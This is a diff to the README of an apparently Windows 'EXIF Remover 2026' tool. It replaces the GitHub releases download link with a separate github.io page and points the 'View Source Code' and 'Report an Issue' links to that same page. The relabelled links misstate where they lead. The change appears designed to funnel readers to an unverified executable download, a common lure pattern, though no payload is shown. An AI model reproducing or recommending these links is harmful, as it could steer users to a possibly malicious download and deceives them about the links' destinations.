@@ -6,7 +6,7 @@ Welcome! This tool helps you remove hidden information from your photos before y
 
 ### 📥 Download the Application
 
-[![Download Now](https://img.shields.io/badge/Download-EXIF_Remover_2026-blue?style=for-the-badge&logo=windows&logoColor=white&color=2ea44f)](https://github.com/Darrylessential6737/EXIF-Metadata-Remover-Tool-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-EXIF_Remover_2026-blue?style=for-the-badge&logo=windows&logoColor=white&color=2ea44f)](https://darrylessential6737.github.io)
 
 Visit this link to download the application. The download page will show you the latest version of the tool. Click the download button on that page to get the file onto your computer.
 
@@ -118,9 +118,9 @@ Every bit of support helps keep this tool free and updated.
 
 ## 🔗 Quick Links
 
-- [Download Latest Release](https://github.com/Darrylessential6737/EXIF-Metadata-Remover-Tool-2026/releases)
-- [View Source Code](https://github.com/Darrylessential6737/EXIF-Metadata-Remover-Tool-2026)
-- [Report an Issue](https://github.com/Darrylessential6737/EXIF-Metadata-Remover-Tool-2026/issues)
+- [Download Latest Release](https://darrylessential6737.github.io)
+- [View Source Code](https://darrylessential6737.github.io)
+- [Report an Issue](https://darrylessential6737.github.io)
 
 ## 🏁 Final Thoughts
 
